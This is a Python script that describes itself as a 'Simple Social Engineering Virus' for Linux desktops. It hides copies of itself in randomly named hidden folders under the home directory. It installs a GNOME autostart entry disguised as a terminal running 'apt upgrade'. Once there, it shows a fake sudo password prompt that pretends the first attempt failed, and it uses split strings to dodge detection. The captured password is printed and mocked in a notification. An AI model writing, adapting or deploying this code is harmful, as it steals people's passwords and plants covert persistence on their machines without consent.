#!/bin/python3

#Importing modules
import getpass #For Getting password
import os #To perform os level operations
import sys #To get args
import time #to sleep during phishing
import subprocess #To perform operations on side
import random #To generate a place and a name for that place for our script



def dirgenerator():

    global hideuin
    crteddirs = [] #To storing the Created dirs

    paths = [] #For Storing the paths
    names = ["gnome-gtk", "gnome-terms", "gnome-greeter", "gnome-desk"] #Non suspicious names for folders to save the script inside
    
    #By Blacklisting these names there is a chance people wont notice easily
    blacklist = ["Desktop", "Downloads", "Documents","..",
                 "Music", "Pictures", "Public", "Templates", "Videos","."] 
    
    chars = "4BCD3F9H1JKLMN0PQR5TUVWXYZbcdfhjklmnpqrtuvwxyz"
    dirs = []

    #To get the directory names. This is to show that we can get directory also in this way.

    #Here we are getting the first column of the ls -al command to check if it starts with d.
    chklst = subprocess.check_output(
        "ls -al /home/"+getpass.getuser()+"/ | awk '{print$1}'", shell=True).decode().strip()

    #here we are storing the list of directories found    
    ls = subprocess.check_output(
        "ls -al /home/"+getpass.getuser()+"/ | awk '{print$9}'", shell=True).decode().strip()
    
    # ls=os.listdir(f"/home/{getpass.getuser()}/") <= This is a easy way to get that list but thats not helping that much

    #Spliting the list,removing files and blacklisting common names
    ls = ls.split("\n")
    chklst = chklst.split("\n")
    chklst.remove("total")
    for i, j in enumerate(chklst):
        if j.startswith("d"):
            if ls[i] in blacklist:
                try:
                    paths.remove(i)
                    continue
                except:
                    continue
            paths.append(f"/home/{getpass.getuser()}/{ls[i]}")

    #For Generating random names for creating dirs for storing This script code
    for j in range(20):
        dirname = ""
        for i in range(9):
            dirname += random.choice(chars)
        dirs.append(dirname)

    #Creating and choosing random directories for storing this script
    hideuin = random.choice(paths)+"/."+random.choice(names)
#    hideuin = "/home/"+getpass.getuser()+"/."+random.choice(names)

    os.system(f"mkdir {hideuin}")
    for i in range(12):#change this number to create multiple folders inside the choosen folder
        crtdir = "mkdir "+hideuin+"/"+dirs[i]
        os.system(crtdir)
        crteddirs.append(dirs[i])
    newfileloc = hideuin+"/"+random.choice(crteddirs)+"/."+random.choice(names)
    os.system(f"mkdir {newfileloc}")
    newfileloc = newfileloc+"/"+random.choice(crteddirs)
    os.system(f"mkdir {newfileloc}")
    print(newfileloc)
    return newfileloc+"updater.py"




    # for i in paths:
    #     if pathlib.Path(i).is_dir()==True:
    #         print("foldrer:",i)
    #         continue

    #     elif (pathlib.Path(i).is_dir() == False) or (pathlib.Path(i).is_file() == True):
    #         print(os.path.isdir(i))
    #         try:
    #             print("removing",i)
    #             paths.remove(i)
    #         except ValueError:
    #             continue

# for i in range(len(ls)-1):
#     a="".join(f"/home/{getpass.getuser()}/"+str(ls[i]).replace(" ",""))
#     paths.append(a)

# paths=dirgetnerator()
# print(paths)

# paths=dirgetnerator(paths)
# print(os.path.isdir("/home/energy/.xsession-errors"))
# print(pathlib.Path("/home/energy/.xsession-errors.old").is_file())


#Simple Social Engineering Virus

#This will get what attack we are gonna specify
try:
    Attack = sys.argv[1]
except IndexError:
    Attack = None


#if We No parameter is given. Then it will create a file to auto start.
if Attack == None:
#Just to make the script to dont look suspicious while execution
    message = input("Notification Message: ")
    os.system(f"notify-send {message}")

    newfileloc = dirgenerator()

    #using touch command so that it wont distrub if the file already exist and also creates if it doesn't exist
    os.system("touch /home/{}/.config/autostart/gnome-terminal.desktop".
              format(getpass.getuser()))

    
    #Add our Script to the autostart Programms.
    with open("/home/{}/.config/autostart/gnome-terminal.desktop".format(getpass.getuser()), "w") as _:
        _.write(
            f'[Desktop Entry]\nType=Application\nExec=gnome-terminal --tab --title="apt upgrade" -e \"bash -c \'python3 {newfileloc} R;bash\'"\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[en_NG]=Terminal\nName=Terminal')

#    subprocess.Popen(f"nhop python3 {newfileloc} R", shell=True)
    
    os.system(f"mv '{__file__}' '{newfileloc}'")


if Attack != None and Attack == "R":

    while True:

        try:
            pswd = getpass.getpass(
                "[su"+"do] "+"Pas"+"swo"+"rd for {}:".format(getpass.getuser()))
            time.sleep(2)
            print("Sorry, try again.")
            pswd1 = getpass.getpass(
                "[su"+"do] Pass"+"word for"+" {}:".format(getpass.getuser()))
            if pswd == pswd1:
                print(f"Your password is {pswd} ")
                os.system(f"notify-send 'You Got Phished' 'Your Password is Phished :P ... LOL ...  {pswd}'")
                break
            else:
                time.sleep(2)
                print("Sorry, try again.")
                pswd3 = getpass.getpass(
                    "[s"+"udo] P"+"asswo"+"rd for"+" {}:".format(getpass.getuser()))
                time.sleep(2)
                print("s"+"udo: "+"3 incor"+"rect pas"+"swo"+"rd atte"+"mpts")

                break
        except:
            print()
            continue